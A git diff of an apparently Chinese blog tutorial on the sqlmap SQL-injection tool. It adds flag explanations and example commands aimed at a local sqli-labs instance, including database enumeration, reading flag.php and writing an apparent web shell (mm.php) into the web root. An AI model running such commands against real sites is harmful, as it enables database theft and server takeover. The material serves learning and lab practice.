@@ -1,6 +1,6 @@
 ---
-title: Sqlmap注入使用技巧
-date: 2019-04-09 13:13:05
+title: Sqlmap注入使用技巧总结
+date: 2020-01-11 13:13:05
 tags:
     - Sqlmap
     - SQL注入
@@ -35,7 +35,7 @@ SQL注入技术：
 5. 获取字段内容
 > sqlmap -u URL -D database -T tablename -C columnsname --dump
 
-## 常用检测参数
+## SQLMAP检测参数
 ```bash
 --current-user      检索当前用户
 --current-db        检索当前数据库
@@ -104,6 +104,63 @@ Brute force（蛮力）：
     –common-columns 检查存在共同列
 ```
 
+## 不同传参方式注入
+### GET
+> sqlmap -u <url>
+### POST
+1. 从抓取文件中检测
+> sqlmap -r <filename>
+2. 从指定参数检测
+> sqlmap --data "uname=1&password=2" -p uname
+3. 自动检测表单传入参数
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-11/" --forms --batch --threads 10 --current-db
+### Cookies
+> sqlmap -r <filename> --level 2
+### PUT
+
+## 常用参数
+1. **-–batch** 默认选项运行
+2. **--dbs** 爆破数据库
+3. **-–technique** 指定sqlmap使用的检测技术
+    - B:Boolean-based-blind （布尔型注入）
+    - U:Union query-based （联合注入）
+    - E:Error-based （报错型注入)
+    - S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）
+    - T:Time-based blind （基于时间延迟注入）
+4. * **-r** 读取抓包文件
+5. * **-p** 需要检测的参数
+6. * **--threads** 线程数
+7. * **-data** 传入post参数（免去抓包）
+* **--level** 
+
+    level: 设置检测的方方面面和测试用例
+        - 默认是1,会尝试POST和GET
+        - 2:Cookie也会加入检测
+        - 3:User-Agent和Referer也会检测, 更大的值会增加用例量
+
+8. * **--user-agent** 指定User-Agent
+
+9. * **--data** 指定请求的内容
+
+10. * **--dbms** 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.
+
+11. * **--fresh-queries** fresh-queries会忽略之前的查询结果,进行重新请求操作
+
+12. * **--flush-session** flush-session会清空当前URL相关的session
+
+## 实战案例
+
+1. 读取flag.php文件内容
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-1/index.php?id=1" --file-read "E:\\flag.php"
+2. 将mm.php写入目标网站根目录
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --file-write "/home/bb/mm.php" --file-dest "E:\\mm.php" --batch
+3. 默认参数的报错注入检测
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --batch --dbs --threads 10 --technique E
+> sqlmap -r 1.txt --batch --dbs --threads 100 --technique ES --level 3
+4. 检测POST请求参数是否有注入点
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --forms --dbs --batch
+5. 使用多个tamper进行检测
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --tamper "xx.py" --batch --dbs
 
 ## 参考文章
 [官方地址](http://sqlmap.org)
